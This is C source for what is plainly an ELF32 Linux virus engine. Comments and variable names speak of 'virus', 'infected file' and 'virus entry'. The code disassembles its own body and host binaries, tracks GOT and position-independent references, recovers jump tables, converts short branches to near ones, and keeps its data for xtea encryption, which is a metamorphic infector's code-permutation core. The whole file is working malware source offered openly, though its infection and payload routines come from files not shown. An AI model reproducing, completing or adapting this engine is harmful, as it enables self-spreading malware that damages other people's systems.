/* sunt lacrimae rerum et mentem mortalia tangunt */
#include <assert.h>
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mcheck.h>
#include <time.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <fcntl.h>
#include <elf.h>
#include <signal.h>

#include "yad.h"
#include "config.h"

typedef struct _code code_t;
struct  _code {
	uint8_t flags;
	uint8_t al;		/* alignment */
	uint8_t	*src;
	union {
		uint32_t dsta;	/* address */
		uint32_t asrc;	/* we'll keep here the offset of alignment insn */
		code_t *list;	/* temporary list pointer for JCC inversion & JMP opt. */
	};
	union {
		uint32_t dref;	/* FL_GOTOFF|FL_ME is set, virus' data reference */
		char *symbol;	/* FL_EXTERN is set, call external function */
		code_t *link;	/* no flags, j../call/..: link to other code structure */
	};
	code_t *next;
	yad_t diza;
};

#define	FL_GOTPTR1	1	/* this ins get GOT	*/
#define	FL_GOTPTR2	2	/* this ins get GOT	*/
#define	FL_FREESRC	4	/* `src' field was malloc()'ed, free it */
#define	FL_EXTERN	8	/* call external function */
#define	FL_ME		16	/* to distinguish virus and code structures */
#define	FL_ALIGN	32	/* padding, remove it */
#define	FL_SEEN		64
#define	FL_GOTOFF	128

typedef struct t_section tsection;
struct t_section {
	Elf32_Shdr *ohdr;		/* old header */
	uint32_t size, offset, addr;
	uint8_t	*data;
	code_t *code;
	code_t **fast;
};

/* the order should be preserved, see SI_BYHASH and hn array */
enum {
	SI_INIT,
	SI_FINI,
	SI_GOT,
	SI_GOTPLT,	
	SI_RELDYN,
	SI_RELPLT,	
	SI_PLT,
	SI_CTOR,
	SI_DATA,
	SI_PRELINKUNDO,
	SI_INTERP,
	
	SI_TEXT,	
	SI_GNUVERSION,
	SI_GNUVERSIONR,	
	SI_HASH,
	SI_DYNSYM,
	SI_DYNSTR,
	SI_DYNAMIC,
	SI_SIZE
};
#define	SI_BYHASH	SI_TEXT

#define	NH_INTERP	0xec5a5e49	/* .interp */
#define	NH_NOTE		0x1a96bba2	/* .note.ABI-tag */
#define	NH_HASH		0x482fdbdc	/* .hash */
#define	NH_DYNSYM	0x25f9db2e	/* .dynsym */
#define	NH_DYNSTR	0x1d5fa896	/* .dynstr */
#define	NH_GNUVERSION	0x48ac83b2	/* .gnu.version */
#define	NH_GNUVERSIONR	0x60b31578	/* .gnu.version_r */
#define	NH_RELDYN	0xad165fbb	/* .rel.dyn */
#define	NH_RELPLT	0x7cee4b79	/* .rel.plt */
#define	NH_INIT		0x5fe35d10	/* .init */
#define	NH_PLT		0xab78fecf	/* .plt */
#define	NH_TEXT		0xa21c1ea3	/* .text */
#define	NH_FINI		0x2e88a1dd	/* .fini */
#define	NH_RODATA	0xd3d1fd96	/* .rodata */
#define	NH_EH_FRAME	0x026a9030	/* .eh_frame */
#define	NH_CTORS	0x2125485c	/* .ctors */
#define	NH_DTORS	0x9305944c	/* .dtors */
#define	NH_JCR		0xd4326193	/* .jcr */
#define	NH_DYNAMIC	0x5f197ac7	/* .dynamic */
#define	NH_GOT		0x993c18f9	/* .got */
#define	NH_GOTPLT	0xb8030735	/* .got.plt */
#define	NH_DATA		0x34644a07	/* .data */
#define	NH_BSS		0xe7e412ec	/* .bss */
#define	NH_GNUDEBUGLINK	0x40754682	/* .gnu_debuglink */
#define NH_PRELINKUNDO	0xeb3d11df      /* .gnu.prelink_undo */
#define NH_GNULIBLIST	0x8f4ff425      /* .gnu.liblist */
#define NH_GNULIBSTR	0xba111249      /* .gnu.libstr */

#define	PAGE_SIZE	4096
#define	ALIGN(x,y)	(((uint32_t)x + y - 1) & ~(y - 1))

#define FOR_EACH_PHDR(__p)	for (__p = phdr; (__p - phdr) < ehdr->e_phnum; __p++)
#define FOR_EACH_SHDR(__s)	for (__s = shdr; (__s - shdr) < ehdr->e_shnum; __s++)

/* list primitives */
#define NEW(type)		({ type *tmp; tmp = (type *)malloc(sizeof(type)); if (tmp != NULL) bzero(tmp, sizeof(type)); tmp; })
#define	FOR_EACH(list, v)	for (v = list; v != NULL; v = v->next)
#define	COUNT(type,list)	({ int t1; type *t2; for (t1 = 0, t2 = list; t2 != NULL; t1++, t2 = t2->next) ; t1; })

/* insns tests */
#define	IS_CALL(x)		(*x == 0xe8)
#define	IS_JMPNEAR(x)		(*x == 0xe9)
#define	IS_JMPSHORT(x)		(*x == 0xeb)
#define	IS_JCCNEAR(x)		(*x == 0x0f && (*(x + 1) & 0xf0) == 0x80)
#define	IS_JCCSHORT(x)		((*x & 0xf0) == 0x70 || (*x & 0xfe) == 0xe2)
#define	IS_DELTAINS(x)		(x[0] == 0x8b && x[2] == 0x24 && (x[1] & 199) == 4)
#define	IS_RET(x)		(*x == 0xc3 || *x == 0xc2)
#define	IS_POP(x)		((*x & 0xf8) == 0x58)
#define	IS_ADD(x)		(x[0] == 0x81 && (x[1] & 0xf8) == 0xc0)
#define	IS_HLT(x)		(*x == 0xf4)
#define	IS_JMPREG(x)		(x[0] == 0xff && (x[1] & 0xf8) == 0xe0)

#define BADPTR ((void*)0xffffffff)

typedef struct _st Tree;
struct _st {
	uint32_t lo, hi, index;
	Tree *left, *right;
};

/* data */
#define	DDEF(type,var,...)	static type __attribute__((section (".data"))) var = __VA_ARGS__
/* the old values of the first four pointers will be used as a key for encryption */
DDEF(code_t, *virus, NULL);
DDEF(code_t, *ventry, NULL);
DDEF(tsection, *sections, NULL);
DDEF(tsection, **sec, NULL);
DDEF(code_t, **fastvirus, NULL);
DDEF(uint32_t, *jt, NULL);
DDEF(Tree,*st,NULL);
DDEF(uint16_t, shnum, 0);
DDEF(uint32_t, virus_data, 0);
DDEF(Elf32_Sym, *dynsym, NULL);
DDEF(char, *relplt, NULL);
DDEF(char, *dynstr, NULL);
#ifndef	PARSE_VERSIONR
DDEF(char, libcstartmain[],"__libc_start_main");
#endif
DDEF(uint32_t,prelink,0);
#ifdef	DEBUG
DDEF(char,ok[],"I'm ok\n");
#endif
DDEF(char, ddot[], {'.', '.', 0});
#if defined(PARSE_VERSIONR) || defined(PRELINK_PERFECT)
DDEF(char, libcso[], "libc.so");
#endif
#ifdef	PRELINK_PERFECT
DDEF(char, format[], "%s --list ./%s");
#endif
DDEF(uint8_t, padding_bytes[120], {
0x90,
0x89, 0xf6,
0x8d, 0x76, 0x00,
0x8d, 0x74, 0x26, 0x00,
0x90, 0x8d, 0x74, 0x26, 0x00,
0x8d, 0xb6, 0x00, 0x00, 0x00, 0x00,
0x8d, 0xb4, 0x26, 0x00, 0x00, 0x00, 0x00,
0x90, 0x8d, 0xb4, 0x26, 0x00, 0x00, 0x00, 0x00,
0x89, 0xf6, 0x8d, 0xbc, 0x27, 0x00, 0x00, 0x00, 0x00,
0x8d, 0x76, 0x00, 0x8d, 0xbc, 0x27, 0x00, 0x00, 0x00, 0x00,
0x8d, 0x74, 0x26, 0x00, 0x8d, 0xbc, 0x27, 0x00, 0x00, 0x00, 0x00,
0x8d, 0xb6, 0x00, 0x00, 0x00, 0x00, 0x8d, 0xbf, 0x00, 0x00, 0x00, 0x00,
0x8d, 0xb6, 0x00, 0x00, 0x00, 0x00, 0x8d, 0xbc, 0x27, 0x00, 0x00, 0x00, 0x00,
0x8d, 0xb4, 0x26, 0x00, 0x00, 0x00, 0x00, 0x8d, 0xbc, 0x27, 0x00, 0x00, 0x00, 0x00,
0xeb, 0x0d, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90                                                                              
});                     
DDEF(uint32_t, hn[SI_BYHASH], {
	NH_INIT,
	NH_FINI,
	NH_GOT,
	NH_GOTPLT,
	NH_RELDYN,
	NH_RELPLT,
	NH_PLT,
	NH_CTORS,
	NH_DATA,
	NH_PRELINKUNDO,
	NH_INTERP
});
DDEF(uint32_t, voffs, 0xdeadbeef);	/* virus entry */
DDEF(uint32_t, stext, 0);		/* start of .text in infected file */
DDEF(uint32_t, etext, 0);		/* end of .text in infected file */
DDEF(uint32_t, randseed, 0);
#include "yad_data.h"
#ifdef	ADVANCED_MARKER
DDEF(uint8_t, *primes, NULL);
#endif
DDEF(int, data_end, 0);
/* end of data */

static uint32_t _random(uint32_t range)
{
	return range == 0 ? 0 : (randseed = randseed * 214013 + 2531011) % range;
}

#include "yad.c"
#include "xtea.c"
#ifdef	ADVANCED_MARKER
#include "primes.c"
#endif

static uint32_t crc32(uint32_t crc, const void *data, int len)
{
	uint8_t		*tmp = (uint8_t*)data;
	int		i;
	crc = ~crc;
	while (len--) {
		crc ^= *tmp++;
		for (i = 0; i < 8; i++)
			if (crc & 1)
				crc >>= 1, crc ^= 0xedb88320;
			else
				crc >>= 1;
	}
	return ~crc;
}

/* functions to deal with .hash section */
static unsigned long elf_hash(const unsigned char *name) {
	unsigned long h = 0, g;
	while (*name) {
		h = (h << 4) + *name++;
		g = h & 0xf0000000;
		if (g)
			h ^= g >> 24;
		h &= ~g;
	}
	return h;
}

static void build_hash(uint32_t *hash, int nbuckets, int nchains, Elf32_Sym *sym, char *str) {
	uint32_t i, h, *buckets, *chains;
	buckets = hash + 2;
	chains	= buckets + nbuckets;
	hash[0] = nbuckets;
	hash[1] = nchains;
	for (i = 1; i < nchains; i++) {
		h = elf_hash(str + sym[i].st_name) % nbuckets;
		if (buckets[h] == 0)
			buckets[h] = i;
		else {
			h = buckets[h];
			while (chains[h] != 0)
				h = chains[h];
			chains[h] = i;
		}
	}
}

static int lookup(char *name, uint32_t *hash, Elf32_Sym *sym, char *str)
{
	uint32_t nbuckets, nchains, *buckets, *chains, h, idx;
	
	nbuckets= hash[0];
	nchains	= hash[1];
	buckets = hash + 2;
	chains	= buckets + nbuckets;
	
	h = elf_hash(name) % nbuckets;
	for (idx = buckets[h]; idx != 0; idx = chains[idx]) {
		if (!strcmp(name, sym[idx].st_name + str))
			return idx;
	}
	return -1;
}

static code_t *disassemble(code_t *code, uint8_t *map, code_t **fast, uint32_t off, uint32_t start, uint32_t end)
{
	code_t *c, *q;
	int i;
	
	while (off >= start && off < end) {
		/* do we have this instruction? */
		if (fast[off - start] != NULL)
			return code;
		if ((c = NEW(code_t)) == NULL)
			goto error2;
		c->src = map + off;
		fast[off - start] = c;
		for (i = 14; i >= 0; i--)
			if (memcmp(c->src, padding_bytes + ((i + 1) * i / 2), i + 1) == 0) {
				c->diza.len = i + 1;
				c->asrc = off;
				c->flags |= FL_ALIGN;
				goto __ins;
			}
		if (yad(map + off, &c->diza) == 0)
			goto error1;
		if ((c->diza.flags & C_BAD) && *(uint16_t*)(map + off) != 0 && *(uint16_t*)(map + off) != 0xffff)
			goto error1;
__ins:		if (code == NULL || c->src < code->src) {
			c->next = code;
			code = c;
		} else {
			q = code;
			while (q->next != NULL && q->next->src < c->src)
				q = q->next;
			c->next = q->next;
			q->next = c;
		}
		if (end == -1) {
			if (IS_RET(c->src))
				return code;
			if (c->diza.flags & C_REL) {
				uint32_t jmp;
				if (c->diza.datasize == 4)	
					jmp = off + c->diza.len + (int)c->diza.data4;
				else
					jmp = off + c->diza.len + (char)c->diza.data1;
				if (c->diza.flags & C_STOP) {
					off = jmp;
					continue;
				} else
					if ((code = disassemble(code, map, fast, jmp, start, end)) == NULL)
						return NULL;	/* nothing to free */
			}
		}
		off += c->diza.len;
	}
	return code;
error1:	free(c);
error2:	for (c = code; c != NULL;) {
		code = c;
		c = c->next;
		free(code);
	}
	return NULL;
}

/* this insert assumes that data is sorted and produces degenerated tree */
Tree *insert(uint32_t index, uint32_t lo, uint32_t hi, Tree *root) {
	Tree *new = NEW(Tree), *p;
	new->index= index;
	new->lo = lo;
	new->hi = hi;
	if (root == NULL)
		return new;
	p = root;
	while (p->right != NULL)
		p = p->right;
	p->right = new;
	return root;
}

/* slightly modified, original was in */
/* A. Andersson. "Implemeting General Balanced Trees." */
/* http://user.it.uu.se/~arnea/ps/gbimpl.txt */
static void balance(Tree **t)
{
	long b, w;
	static int count(Tree *tree) {
		if (tree == NULL)
			return 0;
		return count(tree->left) + count(tree->right) + 1;
	}
	static void split(Tree **t, long p1, long p2) {
		long incr = p1 - p2, count = 0, i;
		static Tree *leftrot(Tree *t) {
			Tree *tmp;
			tmp = t; 
			t = t->right; 
			tmp->right = t->left; 
			t->left = tmp;
			return t;
		}
		for (i = p2; i > 0; i--) {
			count += incr;
			if (count >= p2) {
				*t = leftrot(*t);
				count -= p2;
			}
			t = &(*t)->right;
		}
	}
	for (w = count(*t) + 1, b = 1; b <= w; b <<= 1)
		;
	if ((b >>= 1) != w)
		split(t, w - 1, b - 1); 
	for ( ; b > 2; b >>= 1)
		split(t, b - 1, (b >> 1) - 1);
}

static void free_tree(Tree *tree)
{
	if (tree == NULL)
		return;
	free_tree(tree->left);
	free_tree(tree->right);
	free(tree);
}

static int section_io_by_addr(uint32_t *si, uint32_t *so, uint32_t addr)
{
	Tree *tree;

	for (tree = st;;)
		if (tree->left && addr < tree->lo)
			tree = tree->left;
		else if (tree->right && addr >= tree->hi)
			tree = tree->right;
		else
			break;
	if (addr < tree->lo || addr > tree->hi)
		return 1;
	*si = tree->index;
	*so = addr - tree->lo;
	return 0;
}

#ifndef	OJMP
/* convert short sommand to its near equivalent */
/* this code has been taken from RPME (c) Z0mbie */
static int convert_rel(code_t *c)
{
	uint8_t b, *buf;
	
	if ((buf = malloc(8)) == NULL)
		return 1;
	bzero(buf, 8);

	b = c->src[0];
	c->src = buf;
	c->flags |= FL_FREESRC;
	/* short jcc? */
	if ((b & 0xf0) == 0x70) {
		buf[0] = 0x0f;
		buf[1] = 0xf0 ^ b;
		c->diza.len = 6;
	} else /* short jmp? */
	if (b == 0xeb) {
		buf[0] = 0xe9;
		c->diza.len = 5;
	} else /* loop/z/nz,jcxz? */
	/* gcc does not use them, but... */
	if ((b & 0xfc) == 0xe0) {
		/* loop */
		if (b == 0xe2) {
			buf[0] = 0x49;			/* dec ecx */
			*(uint16_t*)(buf + 1) = 0x850f;	/* jnz near */
			c->diza.len = 7;
		} else /* jczx */
		if (b == 0xe3) {
			*(uint16_t*)(buf + 0) = 0xC909;	/* or ecx, ecx */
			*(uint16_t*)(buf + 2) = 0x840F;	/* jz near */
			c->diza.len = 8;
		} else	return 1;
	}
	return 0;
}
#else
/* two-way convert function */
static int convert_rel(code_t *c, int up_down)
{
	uint8_t b0, b1, *buf;
	
	if ((buf = malloc(8)) == NULL)
		return 1;
	bzero(buf, 8);
	b0 = c->src[0];
	b1 = c->src[1];

	/* DOWN */
	if (up_down) {
		if (b0 == 0x0f && (b1 & 0xf0) == 0x80)
			buf[0] = 0xf0 ^ b1;
		else if (b0 == 0xe9)
			buf[0] = 0xeb;
		else if (b0 == 0x49 && b1 == 0x0f)
			buf[0] = 0xe2;
		else if (b0 == 0x09 && b1 == 0xc9)
			buf[0] = 0xe3;
		else	/* FIXME: loope / loopne */
			return 1;
		c->diza.len = 2;
		c->diza.addrsize = 1;
	} else {
	/* UP */
		/* short jcc? */
		if ((b0 & 0xf0) == 0x70) {
			buf[0] = 0x0f;
			buf[1] = 0xf0 ^ b0;
			c->diza.len = 6;
		} else /* short jmp? */
		if (b0 == 0xeb) {
			buf[0] = 0xe9;
			c->diza.len = 5;
		} else /* loop/z/nz,jcxz? */
		/* gcc does not use them, but... */
		if ((b0 & 0xfc) == 0xe0) {
			/* loop */
			if (b0 == 0xe2) {
				buf[0] = 0x49;			/* dec ecx */
				*(uint16_t*)(buf + 1) = 0x850f;	/* jnz near */
				c->diza.len = 7;
			} else /* jczx */
			if (b0 == 0xe3) {
				*(uint16_t*)(buf + 0) = 0xC909;	/* or ecx, ecx */
				*(uint16_t*)(buf + 2) = 0x840F;	/* jz near */
				c->diza.len = 8;
			} else
				return 1;
		}
		c->diza.addrsize = 4;
	}
	if (c->flags & FL_FREESRC)
		free(c->src);
	c->src = buf;
	c->flags |= FL_FREESRC;	
	return 0;
}
#endif /* OJMP */

typedef struct t_markinfo markinfo;
struct t_markinfo {
	int is_virus;
	uint8_t *base;
	char *plt;
	char *str;
	Elf32_Sym *dyn;
	code_t **fast;
	uint32_t got_start, got_end;
};

typedef struct t_context context;
struct t_context {
/* var is 0-7 for the regs and negative for the local variables */
	uint32_t var, val;
	context *next;
};

typedef struct t_markcontext markcontext;
struct t_markcontext {
	int pic_reg, stack_reg;
	context *vars;
};

#ifdef DEBUG
void putd(uint32_t d)
{
	int i, x;
	
	for (i = 7; i >= 0; i--) {
		x = (d >> (4 * i)) & 0xf;
		putchar(x > 9 ? x + 'a' - 10 : x + '0');
	}
}
void putb(uint8_t d)
{
	int i, x;
	for (i = 1; i >= 0; i--) {
		x = (d >> (4 * i)) & 0xf;
		putchar(x > 9 ? x + 'a' - 10 : x + '0');
	}
}
#ifdef	DEBUG_TRACE
void puti(int l, uint8_t *b, code_t *c, markcontext *ctx)
{
	int i;
	for (i = 0; i < l; i++)
		putchar('\t');
	putd(c->src - b + prelink);
	putchar(' ');
	putd(ctx->pic_reg);
	putchar(' ');
	for (i = 0; i < c->diza.len; i++) {
		putb(c->src[i]);
		putchar(' ');
	}
	if (c->flags & FL_GOTOFF)
		putchar('*');
	putchar('\n');
}
#endif	/* DEBUG_TRACE */
#endif	/* DEBUG */

#ifdef DEBUG_TRACE
static int mark(code_t *code, markinfo *info, markcontext *ctx, code_t **prev_back, int level)
#else
static int mark(code_t *code, markinfo *info, markcontext *ctx, code_t **prev_back)
#endif
{
	uint32_t off, i, back_index, ctx_destroy, r;
	code_t *c;
	code_t *back_frame[18];

	int mark_addr(uint32_t addr) {
		uint32_t si, so;
		if (addr) {
			if (section_io_by_addr(&si, &so, addr) || sections[si].code == NULL)
				return 2;
			if (mark(sections[si].fast[so], info, ctx, back_frame
#ifdef	DEBUG_TRACE
			, level + 1
#endif
			))
				return 1;
		}
		return 0;
	}
	int add_jt_entry(uint32_t entry) {
		if (jt == NULL) {
			if ((jt = (uint32_t*)malloc(8)) == NULL)
				return 1;
			jt[0] = 2;
			jt[1] = 2;			
		}
		if (jt[1] - jt[0] <= 1) {
			jt[1] += 128;
			jt = (uint32_t*)realloc(jt, 4 * jt[1]);
			if (jt == NULL)
				return 1;
		}
		jt[jt[0]++] = entry;
		return 0;
	}
	uint32_t fetch_context(context *ctx, uint32_t var) {
		context *c;
		FOR_EACH(ctx, c)
			if (c->var == var)
				return c->val;
		return 0;
	}
	context *store_context(context *ctx, uint32_t var, uint32_t val) {
		context *c;
		FOR_EACH(ctx, c)
			if (c->var == var) {
				c->val = val;
				return ctx;
			}
		if ((c = (context*)malloc(sizeof(context))) == NULL)
			return NULL;
		c->var = var;
		c->val = val;
		c->next = ctx;
		return c;
	}
	back_index = 0; /* outside if() to supress the warning */
	if (info->is_virus == 0) {
		bzero(back_frame, 18*4);
		back_frame[17] = (void*)prev_back;		
	}
	ctx_destroy = 0;
	if (ctx == NULL) {
		if ((ctx = (markcontext*)malloc(sizeof(markcontext))) == NULL)
			goto finish_err;
		ctx->pic_reg = -1;
		ctx->stack_reg = 4;
		ctx->vars = NULL;
		ctx_destroy++;
	}
	
	FOR_EACH(code, c) {
restart:	if (info->is_virus)
			c->flags |= FL_ME;
		else {
			back_frame[back_index++, back_index &= 15] = c;
			back_frame[16] = (void*)back_index;
		}
		/* after this function returns, the code without
		FL_SEEN flag means that it could not be reached,
		it is dead and should be eliminated */
		if (c->flags & FL_SEEN)
			goto finish_ok;
		c->flags |= FL_SEEN;
#ifdef	DEBUG_TRACE
		if (info->is_virus == 0)
			puti(level, info->base, c, ctx);
#endif
		if (c->diza.flags & C_REL) {
			Elf32_Rel *rel;
			uint32_t jmp, si, so;
			code_t **fast;
			/* fill link field */
			if (c->diza.datasize == 4)
				jmp = (c->src - info->base) + c->diza.len + (int)c->diza.data4;
			else
				jmp = (c->src - info->base) + c->diza.len + (char)c->diza.data1;
#ifndef	OJMP
			/* we won't jumps that might go out of range */
			if (c->diza.addrsize != 4)
				if (convert_rel(c))
					goto finish_err;
#endif
			if (info->is_virus) {
				off = jmp - stext;
				fast = fastvirus;
			} else {
				if (section_io_by_addr(&si, &so, jmp))
					goto finish_err;
				fast = sections[si].fast;
				off  = so;
			}
			/* save the name of imported function, the check should/could be enforced */
			if (IS_CALL(c->src) && *(uint16_t*)(info->base + jmp) == 0xa3ff) {
				jmp = *((uint32_t*)(info->base + jmp + 7));
				rel = (Elf32_Rel*)(info->plt + jmp);
				jmp = ELF32_R_SYM(rel->r_info);
				c->symbol = strdup(info->dyn[jmp].st_name + info->str);
				c->flags |= FL_EXTERN;
			} else {	
				/* fill the link field */
				if ((c->link = fast[off]) == NULL)
					goto finish_err;
			}
			
			/* mark _GLOBAL_OFSET_TABLE_
			a)	324c: call	3251
				3251: pop	%ebx
				3252: add	$0xfd8f,%ebx  
			b)	321b: call	3242
				3220: add	$0xfdc0,%ebx
				....
				3242: mov	(%esp),%ebx
				3245: ret	*/
			if (IS_CALL(c->src) && (c->flags & FL_EXTERN) == 0) {
				code_t *d;
				d = c->next->next;
				/* a) */
				if (d && c->link == c->next && IS_POP(c->next->src) && IS_ADD(d->src))
					d->flags |= FL_GOTPTR1;
				else
				/* b) */
				if (IS_DELTAINS(c->link->src) && IS_ADD(c->next->src))
					c->next->flags |= FL_GOTPTR2;
			}
			/* we won't labels on alignment */
			if ((c->flags & FL_EXTERN) == 0) {
				while (c->link->flags & FL_ALIGN)
					c->link = c->link->next;
			}			
		}
		/* fetch pic_reg */
		if (c->flags & (FL_GOTPTR1 | FL_GOTPTR2)) {
			ctx->pic_reg = c->src[1] & 7;	

		}
		/* HLT / RET / RETN */
		if (c->src[0] == 0xf4 || c->src[0] == 0xc3 || c->src[0] == 0xc2)
			goto finish_ok;
//		if ((c->flags & FL_EXTERN) && *(uint32_t*)(c->symbol + 1) == 0x00746978) /* "xit",0 */
//			goto finish_ok;
		if (c->flags & FL_ALIGN)
			continue;
		/* FIXME: UGLY */
		if (c->src[0] == 0x55 && ((c->src[1] == 0x89 && c->src[2] == 0xe5) || (c->src[1] == 0x54 && c->src[2] == 0x5d)))
			ctx->stack_reg = 5;
		/* MOV local_var, register */
		if ((*c->src & 0xfd) == 0x89 && (c->diza.flags & C_MODRM)) {
			int val = 0;
			// EBP
			if (ctx->stack_reg == 5) {
				if ((c->diza.modrm & 199) == (64 | 5))
					val = (char)c->src[2];
				if ((c->diza.modrm & 199) == (128 | 5))
					val = *(int32_t*)(c->src + 2);
			// ESP probably, this will not work
			} else {
				if ((c->diza.flags & C_SIB) && (c->diza.sib == 0x24) && (c->diza.modrm & 199) == (64 | 4))
					val = (char)c->src[3];
				if ((c->diza.flags & C_SIB) && (c->diza.sib == 0x24) && (c->diza.modrm & 199) == (128 | 4))
					val = *(int32_t*)(c->src + 3);
			}
			if (val < 0) {
				/* this commsnd STORES register contents to stack */
				if (c->src[0] == 0x89)
					if ((ctx->vars = store_context(ctx->vars, val, fetch_context(ctx->vars, (c->diza.modrm >> 3) & 7))) == NULL)
						goto finish_err;
				/* this command LOADS register contents from stack */
				if (c->src[0] == 0x8b)
					if ((ctx->vars = store_context(ctx->vars, (c->diza.modrm >> 3) & 7, fetch_context(ctx->vars, val))) == NULL)
						goto finish_err;
			}
		}			
		/* BRANCH TABLES
			...
			call	.L0				
		.L0:	pop	%ebx
			add	...,%ebx			; (3)
			...
			cmp	$0x22,%esi			; (2)
			ja	k_ebanoy_materi
			...
			mov	0xffffe3f0(%ebx,%esi,4),%eax	; (1)
			...
			add	%ebx,%eax
			...
			jmp	*%eax				; we start here		*/
		if (IS_JMPREG(c->src)) {
			uint32_t cmp_stack = 0;
			uint32_t jmp_reg = c->src[1] & 7;
			int idx_reg = -1;
			uint32_t jtaddr, jtsize, unwind;
			code_t *d;
			jtaddr = jtsize = 0;
			unwind = 0;

restart_jt:		back_frame[back_index] = NULL;
			for (;;) {		
				d = back_frame[back_index--, back_index &= 15];
				/* unwind back frame */
				if (d == NULL) {
					/* no info to unwind */
					if (back_frame[17] == NULL || unwind > 1)
						goto finish_err;
					unwind++;
					memcpy(back_frame, back_frame[17], 18 * 4);
					back_index = ((unsigned int)back_frame[16] + 1) & 15;
					goto restart_jt;
				}
				/* fetch index register and jt address */
				if (jtaddr == 0) {
					if ((d->diza.flags & C_MODRM) && ((d->diza.modrm >> 3) & 7) == jmp_reg) { 
						if (d->diza.flags & C_SIB) {
							if ((d->diza.sib & 199) == (128 | ctx->pic_reg)) {
								jtaddr = info->got_end + (int)d->diza.addr4;
							} else {
								jtaddr = fetch_context(ctx->vars, d->diza.sib & 7);
							}
							idx_reg = (d->diza.sib >> 3) & 7;
						}						
					}
				} else {
					if (jtsize == 0) {
						/* FIXME: this is a quick hack that deal this jump-tables there _index_
						register is actually a local variable, the code could deal with programs
						having stack pointer and only a few cmp-commands are tested... */
						if ((d->src[0] == 0x8b) && (d->diza.flags & C_MODRM) && ((d->diza.modrm >> 3) & 7) == (uint32_t)idx_reg) {
							if ((d->diza.modrm & 199) == (64 | 5))
								cmp_stack = d->src[2];
							if ((d->diza.modrm & 199) == (128 | 5))
								cmp_stack = *(uint32_t*)(d->src + 2);
						}
						if (cmp_stack != 0) {
							if (d->src[0] == 0x83) {
								if (d->src[1] == 0x7d && d->src[2] == cmp_stack)
									jtsize = d->src[3];
								else
								if (d->src[1] == 0xbd && (int)(d->src + 2) == cmp_stack)
									jtsize = *(uint32_t*)(d->src + 6);
							}
						} else {
						/* /FIXME */
							/* (2) get the jump table size */
							/* cmp eax, imm8 */
							if (idx_reg == 0 && d->src[0] == 0x3d)
								jtsize = d->diza.data4;
							/* cmp reg, imm8 */
							else if (d->src[0] == 0x83 && d->src[1] == (0xf8 | (uint32_t)idx_reg))
								jtsize = d->diza.data1;
							/* cmp reg, imm32 */
							else if (d->src[0] == 0x81 && d->src[1] == (0xf8 | (uint32_t)idx_reg))
								jtsize = d->diza.data4;
						}
					} else {
						/* mark each jt entry */
						for (i = 0; i <= jtsize; i++) {
							if (add_jt_entry(jtaddr + i*4))
								goto finish_err;
							/* does jt entry points to the code? no? we fail. */
							if (mark_addr(info->got_end + *(uint32_t*)(info->base + jtaddr + i*4)))
								goto finish_err;
						}
						goto finish_ok;
					}
				}
			}
		}
		if (c->diza.flags & C_REL) {
			/* jmp */
			if (c->diza.flags & C_STOP) {
				c = c->link;
				goto restart;
			} else {
				if (IS_CALL(c->src)) {
					if ((c->flags & FL_EXTERN) == 0 && c->diza.data4 != 0) {
#ifdef	FORCE_ALIGN
						c->link->al = 16;
#endif
						if (mark(c->link, info, NULL, back_frame
#ifdef	DEBUG_TRACE
			, level + 1
#endif				
						))
							goto finish_err;
					}
				} else	/* jcc */
					if (mark(c->link, info, ctx, back_frame
#ifdef	DEBUG_TRACE
			, level + 1
#endif
					))
						goto finish_err;
				continue;
			}
		}

		if (ctx->pic_reg == -1)
			continue;
		/* GOT/GOTOFF */
		if ((c->diza.flags & C_MODRM) == 0 || (c->diza.modrm & 0xc0) != 0x80)
			continue;
		if ((c->diza.modrm & 7) != ctx->pic_reg && ((c->diza.flags & C_SIB) == 0 ||
			(
				(c->diza.sib & 7) != ctx->pic_reg &&
				((c->diza.sib >> 3) & 7) != ctx->pic_reg)))
			continue;
		/* virus use @GOTOFF to data, no @GOT, no code references */
		if (c->flags & FL_ME) {
			c->flags |= FL_GOTOFF;
			c->dref = (uint32_t)c->diza.addr4;
			/* we need offsets (not an addresses) in the virus' data "subsection",
			so we need a minimal value, to use it later like:
			new_data_ptr = old_data_ptr - min_data_ptr + new_data_start */
			if (c->dref < virus_data)
				virus_data = c->dref;
		} else {
			off = info->got_end + c->diza.addr4;
			/* this check excludes @GOT */
			if (off < info->got_start || off >= info->got_end)
				c->flags |= FL_GOTOFF;

			/* MOV/LEA $?(%pix_reg), %reg */
			if (*c->src == 0x8b || *c->src == 0x8d)
				if ((ctx->vars = store_context(ctx->vars, (c->diza.modrm >> 3) & 7, off)) == NULL)
					goto finish_err;
			/* we can distinguish _addresses_ and _constants_, so we shoulf
			check every address, if it points to the code, mark it. 
			we're unsure about whether it's code or data, but one thing
			we know is that it is valid address, so, mark_addr may
			return error here */
			if (off >= info->got_start && off < info->got_end)
				off = *(uint32_t*)(sec[SI_GOT]->data + off - info->got_start) - prelink;
			/* relaxed error checking */
			if (mark_addr(off) == 1)
				goto finish_err;
		}
	}
finish_ok:
	r = 0; goto finish;
finish_err:
	r = 1;
finish:	if (ctx_destroy) {
		if (ctx->vars) {
			context *c0, *c1;
			for (c0 = ctx->vars; c0 != NULL; ) {
				c1 = c0->next;
				free(c0);
				c0 = c1;
			}
		}
		free(ctx);
	}
	return r;
}

static code_t *disassemble_itself(void)
{
	uint8_t *get_base(void) {
		uint8_t *self;
		for (self = (uint8_t*)((uint32_t)&virus & ~(PAGE_SIZE - 1)); ; self -= PAGE_SIZE)
			if (*((uint64_t*)self) == 0x10101464c457fULL)
				break;
		return self;
	}
	int i;
	markinfo info;

	ventry = NULL;
	virus_data = -1;

	info.is_virus = 1;
	info.base = get_base();
	info.dyn = (Elf32_Sym*)((uint32_t)dynsym + (uint32_t)info.base);
	info.str = (char*)((uint32_t)dynstr + (uint32_t)info.base);
	info.plt = (char*)((uint32_t)relplt + (uint32_t)info.base);
	i = etext - stext;
	if ((fastvirus = malloc(i*4)) == NULL)
		return BADPTR;
	bzero(fastvirus, i*4);
	info.fast = fastvirus;
	if ((virus = disassemble(NULL, info.base, fastvirus, voffs, stext, -1)) == NULL)
		return BADPTR;
	ventry = fastvirus[voffs - stext];
	if (ventry == NULL)
		return BADPTR;
	if (mark(ventry, &info, NULL, NULL
#ifdef	DEBUG_TRACE
			, 0
#endif
	))
		return BADPTR;
	return virus;
}

